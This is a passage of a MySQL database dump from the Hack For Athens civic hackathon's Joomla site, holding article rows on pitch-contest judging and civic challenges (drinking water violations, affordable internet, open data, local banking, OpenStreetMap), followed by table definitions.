class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;Judge Deliberation</h2>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<ul>\r\n<li>After presentations have completed, judges will discuss their impressions and observations, comparing each presentation\'s solution according to the scorecard.</li>\r\n<li>The judges will address each team directly about the strengths and weaknesses of their solution.</li>\r\n<li>Disagreements with the judges is fine, but they should be respectful and address the judges point, not the judges personally.</li>\r\n</ul>\r\n</div>\r\n<div class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;Prizes</h2>\r\n</div>\r\n<!--<div class=\"gantry-example\">\r\n<ul>\r\n<li><strong>1st Prize</strong>: $250, recognition on all social media channels and newsletters</li>\r\n<li><strong>2nd Prize</strong>: $100, recognition on all social media channels and newsletters</li>\r\n<li><strong>3rd Prize</strong>: $50, recognition on all social media channels and newsletters</li>\r\n<li>Equal shares of any prize money won will be paid to each individual on a winning team.</li>\r\n<li>The individual recipients of prize money will be responsible for the tax implications of their winnings.</li>\r\n</ul>\r\n</div>-->\r\n<div class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;Confidentiality and Intellectual Property</h2>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<ul>\r\n<li>The Pitch presentation, code, and other materials comprising the idea behind the Pitch, are considered public domain and will be provided through the Hack For Athens GitHub repository as per our <a href=\"index.php?option=com_content&amp;view=article&amp;id=43&amp;Itemid=199\">Open Source Guidelines</a>.</li>\r\n</ul>\r\n</div>\r\n<div class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;Presentation Scorecard</h2>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<ul>\r\n<li>The following areas comprise the scorecard used by the judges during the Pitch Contest presentations.</li>\r\n<li>The scores themselves are graded on a 1-5 scale, where a score of 1 within each area is the lowest, and 5 is the highest.</li>\r\n<li><strong>Impact</strong>: how much impact (quality and quantity) does the solution have on the challenge?</li>\r\n<li><strong>Complexity</strong>: how much progress did the team make during the event? How creative is the solution?</li>\r\n<li><strong>Sustainability</strong>: how good is the team\'s plan for evolving the solution or having another individual, organization, or government evolve the solution?</li>\r\n<li><strong>Presentation</strong>: How well did the team communicate? How well did they respond to questions from the judges? Was the solution to the challenge presented clearly?</li>\r\n</ul>\r\n</div>','',1,2,'2013-05-02 20:46:14',254,'','2014-04-23 18:55:47',254,0,'0000-00-00 00:00:00','2013-05-02 20:46:14','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":false,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":false,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":false,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_tags\":\"\",\"show_intro\":\"\",\"info_block_position\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',28,1,'','',1,726,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(48,106,'Safe Drinking Water Challenge','safe-drinking-water-challenge','<p class=\"info\">The Safe Drinking Water Information System (SDWIS) contains information about public water systems and their violations of EPA\'s drinking water regulations, as reported to EPA by the states. These regulations establish maximum contaminant levels, treatment techniques, and monitoring and reporting requirements to ensure that water systems provide safe water to their customers. This search will help you to find your drinking water supplier and view its violations and enforcement history since 1993.</p>\r\n<div class=\"gantry-example\">\r\n<h2>The Challenge</h2>\r\n<ol>\r\n<li>Within Clarke and Oconee county, what are the different Public Water Systems ( PWS ), the population served by each one, the regulating agency and the contact name and phone number.<ol>\r\n<li>Public Water Systems by county (deprecated)</li>\r\n</ol></li>\r\n<li>Within Clarke and Oconee county, what are the violations and enforcement actions for the different PWSs.<ol>\r\n<li>Violation and enforcement actions by county&nbsp;(deprecated)</li>\r\n</ol></li>\r\n<li>Create a table linking the violations found in pint #2 above with the contaminant definitions, health effects, and sources referrenced by the violation itself.<ol>\r\n<li>Contimnant definitions&nbsp;(deprecated)</li>\r\n<li>Linking health effects data to violation data&nbsp;(deprecated)</li>\r\n</ol></li>\r\n<li>Create documents (.txt, .doc, .docx, or .tex) for all PWSs found to have regulatory violation(s) that:<ol>\r\n<li>Provide the information found in point #2 and #3</li>\r\n<li>Are addressed to the relevant agency/contact found in point #1</li>\r\n<li>Are distinct, such that each PWS should have it\'s own analysis and document</li>\r\n</ol></li>\r\n</ol></div>\r\n<div class=\"gantry-example\">\r\n<h2>The Data</h2>\r\n<ol>\r\n<li><a href=\"http://www.epa.gov/enviro/facts/sdwis/model.html\" target=\"_blank\">SDWIS Data Model</a> - Contaminant definitions, health effects, and sources of contamination</li>\r\n<li><a href=\"http://www.epa.gov/enviro/facts/sdwis/search.html\" target=\"_blank\">SDWIS Geography Search</a> - The Safe Drinking Water Information System (SDWIS) contains information about public water systems and their violations of EPA\'s drinking water regulations, as reported to EPA by the states</li>\r\n<li><a href=\"images/EPA_Safe_Drinking_Water_Challenge_QuickStart_Guide.docx\">QuickStart Guide from EPA</a></li>\r\n</ol></div>','',1,18,'2013-05-21 19:55:29',254,'','2013-06-01 17:47:31',254,0,'0000-00-00 00:00:00','2013-05-21 19:55:29','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',8,5,'','',1,910,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(49,108,'Athens Affordable Internet Challenge','athens-affordable-internet-challenge','<p class=\"info\">According to the 2010 U.S. Census, over one-­third (34.5%) of Athens­-Clarke County residents live below the poverty line. Furthermore, <a href=\"images/ACC_20_Poverty_Block_Groups.pdf\" target=\"_blank\">poverty block groups</a> comprise 20% of Athens-Clarke County. We believe that providing affordable, reliable internet connections&nbsp;would increase access to job openings, career opportunities, and training opportunities for unemployed and underemployed citizens. We also believe it would encourage more engagement in local government actions.<br /><br />This challenge will require participants to develop a strategy for providing affordable internet access to low-income neighborhoods within Athens-Clarke county with low broadband subscription rates. Participants are encourage to explore the potential for <a href=\"http://detroitdjc.org/wireless-mesh/\" target=\"_blank\">wireless mesh networking</a> as a possible solution.</p>\r\n<div class=\"gantry-example\">\r\n<h2>The Challenge</h2>\r\n<ol>\r\n<li>Identify the correlation between low-income neighborhoods and low internet subscription rates</li>\r\n<li>Create a strategy for providing internet access to these low-income neighborhoods by:<ol>\r\n<li>Either identifying the most affordable internet connectivity services offered within these poverty block groups through existing internet service providers</li>\r\n<li>Or determining how best to build and support wireless mesh networks in these areas</li>\r\n</ol></li>\r\n<li>Outline an awareness campaign that targets lower income neighborhoods for the purposes of spreading this information</li>\r\n<li>Include local organizations such as <a href=\"http://www.freeitathens.org/\" target=\"_blank\">Free IT Athens</a> and <a href=\"http://communityconnection211.org/\" target=\"_blank\">Community Connection</a> in both the strategy for providing internet access as well as the awareness campaign by:<ol>\r\n<li>Identifying their strengths or relevant services</li>\r\n<li>Create a strategy for integrating said strengths/services</li>\r\n</ol></li>\r\n</ol></div>\r\n<div class=\"gantry-example\">\r\n<h2>The Data</h2>\r\n<ol>\r\n<li><a href=\"http://investigativereportingworkshop.org/investigations/broadband-adoption/htmlmulti/broadband-adoption-map/\" target=\"_blank\">Broadband Adoption Rates</a> - Demographic data come from the U.S. Census\' 2005-9 American Community Survey; Broadband adoption is based on the 768Kbps download / 200Kbps upload standard used by the Federal Communications Commission</li>\r\n<li><a href=\"http://www.internetessentials.com/\" target=\"_blank\">Comcast Internet Essentials</a> - An affordable service offered by a major internet service provider that includes the option to purchase affordable hardware as well</li>\r\n<li><a href=\"http://www.census.gov/hhes/www/poverty/index.html\" target=\"_blank\">US Census Poverty Data</a> - The Census Bureau poverty data reports from several major household surveys and programs</li>\r\n</ol></div>','',1,18,'2013-05-21 19:55:29',254,'','2013-05-29 02:02:33',254,0,'0000-00-00 00:00:00','2013-05-21 19:55:29','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',9,4,'','',1,1199,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(50,109,'Athens Alive Challenge','athens-alive-challenge','<p class=\"info\">Currently, Map APIs and services such as <a href=\"https://developers.google.com/maps/\" target=\"_blank\">Google Maps</a> provide a wealth of information for local business, such as their address, phone number, local reviews, business description, etc.<br><br>However, the businesses information only tells half the story, and an open source model that integrates social media would allow others to see the business from the Athens citizens\' perspective. This challenge requires that a visual model for Athens be built that integrates social media into existing information, data, and views.</p>\r\n<div class=\"gantry-example\">\r\n<h2>The Challenge</h2>\r\n<ol>\r\n<li>Create a model for Athens that uses social media to enrich the local business districts</li>\r\n<li>Using a mapping service such as <a href=\"https://developers.google.com/maps/\" target=\"_blank\">Google Maps</a>, focus on Athens</li>\r\n<li>Populate the map with local businesses, such as restaurants, retail stores, etc.</li>\r\n<li>Allow users to enable and disable businesses based on their category. For example, the \"Restaurants\" category will be enabled by default, but when disabled all information within the map that pertains to \"Restaurants\" would be hidden or removed</li>\r\n<li>Allow users to log in with their <a href=\"https://developers.facebook.com/docs/reference/apis/\" target=\"_blank\">Facebook</a> and/or <a href=\"https://dev.twitter.com/\" target=\"_blank\">Twitter</a> account</li>\r\n<li>Combine the information within the user\'s social media account, such as photos and posts, with the local businesses so that the business\'s information is paired with Athens citizens\' involvement and experiences</li>\r\n</ol></div>\r\n\r\n<div class=\"gantry-example\">\r\n<h2>The Data</h2>\r\n<ol>\r\n<li><a href=\"https://developers.google.com/maps/\" target=\"_blank\">Google Maps API</a></li>\r\n<li><a href=\"https://developers.facebook.com/docs/reference/apis/\" target=\"_blank\">Facebook API</a></li>\r\n<li><a href=\"https://dev.twitter.com/\" target=\"_blank\">Twitter API</a></li>\r\n</ol></div>','',1,18,'2013-05-21 19:55:29',254,'','2013-05-29 02:02:19',254,0,'0000-00-00 00:00:00','2013-05-21 19:55:29','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',7,3,'','',1,512,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(51,110,'Athens Open Data Portal Challenge','athens-open-data-portal-challenge','<p class=\"info\">Athens needs a publicly available open data portal in order for Athens to have a basis for the creation of useful civic applications by citizens or third party developers in the future. This challenge requires the creation of a system that promotes openness, transparency, and accountability of local government by providing high-value government data in standards compliant, machine readable formats.</p>\r\n<div class=\"gantry-example\">\r\n<h2>The Challenge</h2>\r\n<ol>\r\n<li>Create a system that promotes openness, transparency, and accountability of local government by providing high-value government data in standards compliant, machine readable formats<ol>\r\n<li>Need help? <a href=\"http://ckan.org/\" target=\"_blank\">Take this idea for example then</a>. What this challenge calls for is adapting to work for Athens and Open Data specifically.</li>\r\n<li>Be creative, Athens is very unique, and a cookie-cutter solution won\'t necessarily solve the challenge!</li>\r\n</ol></li>\r\n<li>Allow for data categorization.<ol>\r\n<li>For example, historical data is different from transportation data, and thus should be in a different category when searching for data as an end-user</li>\r\n</ol></li>\r\n<li>Allow administrators to add data such that each entry has a title, description, and corresponding files in machine readable formats</li>\r\n<li>Data can be searched through by title and description</li>\r\n<li>Data that is added to the platform by an administrator must be verified as Open Data, such that it <a href=\"http://en.wikipedia.org/wiki/Open_data\" target=\"_blank\">satisfies the definition of Open Data</a></li>\r\n</ol></div>\r\n<div class=\"gantry-example\">\r\n<h2>The Data</h2>\r\n<ol>\r\n<li><a href=\"http://www.data.gov/opendatasites\" target=\"_blank\">Data.gov sites and applications</a></li>\r\n<li><a href=\"http://opencityapps.org/\" target=\"_blank\">Open City App</a> - Open Source projects created by other civic hacking events and groups</li>\r\n<li><a href=\"http://www.opengovtplatform.org/\" target=\"_blank\">Open Government Platform</a> - OGPL is a joint product from India and United States to promote transparency and greater citizen engagement by making more government data, documents, tools and processes publicly available</li>\r\n</ol></div>','',1,18,'2013-05-21 19:55:29',254,'','2013-05-29 02:05:42',254,0,'0000-00-00 00:00:00','2013-05-21 19:55:29','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',5,2,'','',1,870,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(52,111,'Local Banking Benefits Challenge','local-banking-benefits-challenge','<p class=\"info\">Local banks everywhere constantly struggle with educating or informing local citizens of the benefits of buying and banking locally. This challenge requires the creation of an interactive map that conveys that banking locally is not just convenient, but that moving your money to a local bank benefits the community as a whole.</p>\r\n<div class=\"gantry-example\">\r\n<h2>The Challenge</h2>\r\n<ol>\r\n<li>Get the latest deposit data showing the breakdown of money in local banks vs money in national banks</li>\r\n<li>Create a visualization or infographic that conveys the effect of the \"local banking multiplier\"</li>\r\n<li>Essentially, this multiplier means that up to nine times the value of a single local deposit can return to the community in the form of a loan</li>\r\n<li>Display the branches of local banks throughout Athens-Clark County as well as every county immediately surrounding ACC<ol>\r\n<li>One example of this is in&nbsp;<a href=\"http://sonomacounty.golocal.coop/businesses/finance-insurance-and-real-estate/banks-and-credit-unions\" target=\"_blank\">Sonoma County, CA</a></li>\r\n</ol></li>\r\n</ol></div>\r\n\r\n<div class=\"gantry-example\">\r\n<h2>The Data</h2>\r\n<ol>\r\n<li>The FDIC released data on October 12, 2012 of <a href=\"https://explore.data.gov/Banking-Finance-and-Insurance/FDIC-Summary-of-Deposits-SOD-Download-File/eq99-z357\" target=\"_blank\">all bank branches and their deposit amounts</a>. More information and data dictionary <a href=\"http://www2.fdic.gov/sod/\" target=\"_blank\">available here</a></li>\r\n<li>The National Credit Union Administration has <a href=\"http://researchcu.ncua.gov/Views/FindCreditUnions.aspx\" target=\"_blank\">data on credit unions</a> and their deposits</li>\r\n<li>If additional data about personal income, wages, etc. is needed, county-level information is available from the Bureau of Economic Analysis. The Bureau of Economic Analysis, a national sponsor of Hack for Change, has also released <a href=\"http://hackforchange.org/challenge/bureau-economic-analysis-api-challenge\" target=\"_blank\">a beta API</a></li>\r\n</ol>\r\n</div>','',1,18,'2013-05-21 19:55:29',254,'','2013-05-29 02:03:07',254,0,'0000-00-00 00:00:00','2013-05-21 19:55:29','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',6,1,'','',1,542,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(53,112,'Athens OpenStreetMap Challenge','athens-openstreetmap-challenge','<p class=\"info\">OpenStreetMaps is a collaborative mapping project, built by communities. For example, cyclists add cycleroutes, people adopt the task of mapping whole towns, and volunteer mappers place and edit objects like schools, hospitals, and bus stops, making the maps hyperlocal. After the 2010 Haiti earthquake, OpenStreetMap and Crisis Commons volunteers <a href=\"http://www.nytimes.com/2010/02/04/technology/personaltech/04volunteer.html?_r=0%3Cbr%20/%3E\" target=\"_blank\">used available satellite imagery to map the roads, buildings, and refugee camps of Port-au-Prince in two days</a>, aiding relief efforts.</p>\r\n\r\n<div class=\"gantry-example\"><h2>The Challenge</h2>\r\n<ol>\r\n<li>In 2012, Google Maps started charging high-volume users. Although the charges don’t apply to most users, Google can change the terms at any time</li>\r\n<li>As an alternative to Google Maps, this challenge requests the creation of an Athens OpenStreetMap containing the following information (feel free to deviate and add your own if you think it will make for a better solution):\r\n	<ol>\r\n	<li>Athens Transit Bus Routes</li>\r\n	<li>Bike lanes</li>\r\n	<li>Emergency call boxes</li>\r\n	<li>Fire departments and police statements</li>\r\n	</ol>\r\n</li>\r\n<li>Identify other vital resources that you feel would benefit the community if added to the OpenStreetMap, and get them in if you still have time!</li>\r\n</ol>\r\n</div>\r\n\r\n<div class=\"gantry-example\"><h2>The Data</h2>\r\n<ol>\r\n<li><a href=\"https://www.openstreetmap.org/user/new\" target=_blank\">OpenStreetMap Account Creation</a></li>\r\n<li><a href=\"https://josm.openstreetmap.de/\" target=_blank\">Extensible OpenStreetMap editor</a></li>\r\n</ol>\r\n</div>','',1,18,'2013-05-21 19:55:29',254,'','2013-05-29 02:02:49',254,0,'0000-00-00 00:00:00','2013-05-21 19:55:29','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',4,0,'','',1,525,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*','');
/*!40000 ALTER TABLE `hfa_content` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_content_frontpage`
--

DROP TABLE IF EXISTS `hfa_content_frontpage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_content_frontpage` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_content_frontpage`
--

LOCK TABLES `hfa_content_frontpage` WRITE;
/*!40000 ALTER TABLE `hfa_content_frontpage` DISABLE KEYS */;
INSERT INTO `hfa_content_frontpage` VALUES (37,1);
/*!40000 ALTER TABLE `hfa_content_frontpage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_content_rating`
--

DROP TABLE IF EXISTS `hfa_content_rating`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_content_rating` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `rating_sum` int(10) unsigned NOT NULL DEFAULT '0',
  `rating_count` int(10) unsigned NOT NULL DEFAULT '0',
  `lastip` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_content_rating`
--

LOCK TABLES `hfa_content_rating` WRITE;
/*!40000 ALTER TABLE `hfa_content_rating` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_content_rating` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_content_types`
--

DROP TABLE IF EXISTS `hfa_content_types`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_content_types` (
  `type_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `type_title` varchar(255) NOT NULL DEFAULT '',
  `type_alias` varchar(255) NOT NULL DEFAULT '',
  `table` varchar(255) NOT NULL DEFAULT '',
  `rules` text NOT NULL,
  `field_mappings` text NOT NULL,
  `router` varchar(255) NOT NULL DEFAULT '',
  `content_history_options` varchar(5120) NOT NULL COMMENT 'JSON string for com_contenthistory options',
  PRIMARY KEY (`type_id`),
  KEY `idx_alias` (`type_alias`)
) ENGINE=InnoDB AUTO_INCREMENT=10005 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_content_types`
--

LOCK TABLES `hfa_content_types` WRITE;
/*!40000 ALTER TABLE `hfa_content_types` DISABLE KEYS */;
INSERT INTO `hfa_content_types` VALUES (1,'Article','com_content.article','{\"special\":{\"dbtable\":\"#__content\",\"key\":\"id\",\"type\":\"Content\",\"prefix\":\"JTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"title\",\"core_state\":\"state\",\"core_alias\":\"alias\",\"core_created_time\":\"created\",\"core_modified_time\":\"modified\",\"core_body\":\"introtext\", \"core_hits\":\"hits\",\"core_publish_up\":\"publish_up\",\"core_publish_down\":\"publish_down\",\"core_access\":\"access\", \"core_params\":\"attribs\", \"core_featured\":\"featured\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"images\", \"core_urls\":\"urls\", \"core_version\":\"version\", \"core_ordering\":\"ordering\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"catid\", \"core_xreference\":\"xreference\", \"asset_id\":\"asset_id\"}, \"special\": {\"fulltext\":\"fulltext\"}}','ContentHelperRoute::getArticleRoute','{\"formFile\":\"administrator\\/components\\/com_content\\/models\\/forms\\/article.xml\", \"hideFields\":[\"asset_id\",\"checked_out\",\"checked_out_time\",\"version\"],\"ignoreChanges\":[\"modified_by\", \"modified\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\"],\"convertToInt\":[\"publish_up\", \"publish_down\", \"featured\", \"ordering\"],\"displayLookup\":[{\"sourceColumn\":\"catid\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"created_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"} ]}'),(2,'Weblink','com_weblinks.weblink','{\"special\":{\"dbtable\":\"#__weblinks\",\"key\":\"id\",\"type\":\"Weblink\",\"prefix\":\"WeblinksTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"title\",\"core_state\":\"state\",\"core_alias\":\"alias\",\"core_created_time\":\"created\",\"core_modified_time\":\"modified\",\"core_body\":\"description\", \"core_hits\":\"hits\",\"core_publish_up\":\"publish_up\",\"core_publish_down\":\"publish_down\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"featured\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"images\", \"core_urls\":\"url\", \"core_version\":\"version\", \"core_ordering\":\"ordering\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"catid\", \"core_xreference\":\"xreference\", \"asset_id\":\"null\"}, \"special\": {}}','WeblinksHelperRoute::getWeblinkRoute','{\"formFile\":\"administrator\\/components\\/com_weblinks\\/models\\/forms\\/weblink.xml\", \"hideFields\":[\"asset_id\",\"checked_out\",\"checked_out_time\",\"version\",\"featured\",\"images\"], \"ignoreChanges\":[\"modified_by\", \"modified\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\"], \"convertToInt\":[\"publish_up\", \"publish_down\", \"featured\", \"ordering\"], 